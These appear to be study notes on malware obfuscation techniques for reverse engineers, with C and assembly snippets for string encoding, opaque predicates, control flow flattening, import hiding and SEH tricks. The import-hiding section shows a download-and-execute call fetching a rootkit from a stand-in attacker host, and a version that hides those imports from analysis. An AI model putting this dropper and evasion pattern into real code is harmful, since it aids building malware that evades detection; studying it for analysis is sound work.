# Obfuscation

### String Obfuscation

Example in C code.

```c
char* decrypt(char *str) {
    int i;
    for (i = 0; i < strlen(str); i++)
        str[i] ^= 0xAA;
    return str;
}

int main(void) {
    char str[] = "\xE2\xCF\xC6\xC6\xC5\x8A\xFD\xC5\xD8\xC6\xCE\xA0";
    printf(decrypt(str));
    return 0;
}
```

Example in IDA.

1. Pushes string
2. decodes string with string decoding function

```
.text:00401BF2 A1 F0 2F 43 00       mov     eax, addr_fun_xor
.text:00401BF7 C7 44 24 08 00 00 00 mov     [esp+38h+var_30], 0
.text:00401BF7 00
.text:00401BFF C7 44 24 04 20 D2 45 mov     [esp+38h+var_34], offset Stream
.text:00401BFF 00
.text:00401C07 C7 04 24 00 2A 43 00 mov     [esp+38h+var_38], offset loc_432A00
.text:00401C0E FF D0                call    eax ; fun_xor
```

### Junk Code insertion

Adding code that does not change the semantics of the program.

### Code permutation

For example, obfuscate `mov [X], 42`:

```asm
push 42
pop [X]
```

```asm
mov eax, X
mov [eax], 42
```

```asm
mov edi, X
mov eax, 42
stosd ; copy value of EAX in memory pointed to by EDI
```

```asm
push X
pop edi
push 42
pop eax
stosd ; copy value of EAX in memory pointed to by EDI
```

### Opaque Predicates

#### Bogus Control Flow / Dead Code

Adding bogus control flows which lead to code that is never executed.

Original pseudocode:

```c
a()
b()
```

Obfuscated pseudocode

```c
a();
if(opaque_true)
    b();
else
    deadcode
```

#### Fake Loops

Leads to dead code

Example Pseudocode:

```c
for(int i = 0; i < size; i++) {
    if (opaque_true) {
        break
    }
    deadcode
}
```

#### Random Predicates

Leads to the same code which appears to be different

```c
if (random) {
    OBF_1(b())
} else {
    OBF_2(b())
}
```

### Obfuscate Numbers

Partial Homomorphism allows certain functionality on encrypted data.

Example using modulus.

```c
#define N 3127

int enc(int e, int p) {
    return p * N + e;
}

int dec(int e) {
    return e % N;
}

int encryptedadd(int a, int b) {
    return a + b;
}

int encryptedmul(int a, int b) {
    return a * b;
}
```

    Using add: a, b and pn need to be smaller than N
            \
1. dec(enc(a + b, p1)) = dec(enc(a, p2) + enc(b, p3))
2. dec(enc(a ∗ b, p1)) = dec(enc(a, p2) ∗ enc(b, p3))
             /
    Using mul: a, b and pn need to be smaller than N

### Merging

Merge two functions together that otherwise have nothing in common. To accomplish that, a function often has a flag that
controls which part of the functions is executed.

### Splitting

Split a function in several functions.

### Aliasing

Code seems to be unreachable. It can be reached using aliasing.

```c
int alias(int *a, int *b) {
    *a = 10;
    *b = 5;

    if((*a - *b) == 0)
      code();
    }
```

This is called using:


```c
int a = 0;
alias(&a, &a);
```

### Control Flows Flattening (Chenxify)

Control flow between basic blocks is not handled led using jumps.
This can be done by leveraging a switch statement for instance.

1. The variable next is declared
2. Next is evaluated using a switch statement
3. State of next decides which basic block will be executed

This obfuscates the original control flow.

### Import Hiding

Used to hide imported DLLs that are required to execute API function.

Original code calling `URLDownloadToFile` from `urlmon` and `ShellExecute` from `shell32`.

```c
void main() {
    URLDownloadToFile(0, "http:/ /badboy.org/rootkit.exe", "C:\ rootkit.exe", 0, 0);
    ShellExecute(0, "open", "c:/rootkit.exe", 0, 0 ,0);
    }
```

Those inputs will be present in the IAT.


Alternatively, in obfuscated code the libraries can be retrieved using `LoadLibrary` and `GetProcAddress` from `kernel32` for instance.

1. Definition of function prototypes for the dynamically loaded functions
2. Load the library which contains the desired function using `LoadLibrary`
3. Get the address of the desired function from the library using `GetProcAddress`
4. Make use of the function
5. Free the loaded library from memory

```c
// Definition of function prototypes for the dynamically loaded functions
typedef HRESULT (WINAPI *URLDownloadToFile_t)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
typedef HINSTANCE (WINAPI *ShellExecuteA_t)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);


int main() {
    // Load urlmon.dll for URLDownloadToFile
    HMODULE hUrlmon = LoadLibrary("urlmon.dll");
    if (hUrlmon == NULL) {
        printf("Failed to load urlmon.dll\n");
        return 1;
    }


    // Load shell32.dll for ShellExecute
    HMODULE hShell32 = LoadLibrary("shell32.dll");
    if (hShell32 == NULL) {
        printf("Failed to load shell32.dll\n");
        return 1;
    }


    // Get the address of URLDownloadToFile
    URLDownloadToFile_t pURLDownloadToFile = (URLDownloadToFile_t)GetProcAddress(hUrlmon, "URLDownloadToFileA");
    if (pURLDownloadToFile == NULL) {
        printf("Failed to get address of URLDownloadToFile\n");
        FreeLibrary(hUrlmon);
        return 1;
    }


    // Get the address of ShellExecuteA
    ShellExecuteA_t pShellExecuteA = (ShellExecuteA_t)GetProcAddress(hShell32, "ShellExecuteA");
    if (pShellExecuteA == NULL) {
        printf("Failed to get address of ShellExecuteA\n");
        FreeLibrary(hShell32);
        return 1;
    }


    // Download a file from a URL to a local file
    HRESULT hr = pURLDownloadToFile(NULL, "https://example.com/file.txt", "C:\\path\\to\\downloaded_file.txt", 0, NULL);
    if (FAILED(hr)) {
        printf("Failed to download file. HRESULT: 0x%lx\n", hr);
    } else {
        printf("File downloaded successfully!\n");
    }


    // Use ShellExecute to open the downloaded file
    HINSTANCE hInstance = pShellExecuteA(NULL, "open", "C:\\path\\to\\downloaded_file.txt", NULL, NULL, SW_SHOW);
    if ((INT_PTR)hInstance <= 32) {
        printf("Failed to open file with ShellExecute\n");
    } else {
        printf("File opened successfully!\n");
    }

    // Free the urlmon.dll library
    FreeLibrary(hUrlmon);

    // Free the shell32.dll library
    FreeLibrary(hShell32);

    return 0;
}
```
(example generated with ChatGPT)


### Structured Exception Handler (SEH)

1. Install exception handler
2. provoke exception and jump to exception handler


```asm
mov eax, large fs:0
push offset loc_1244
push eax
mov large fs:0, esp
xor eax, eax
div eax
retn
```

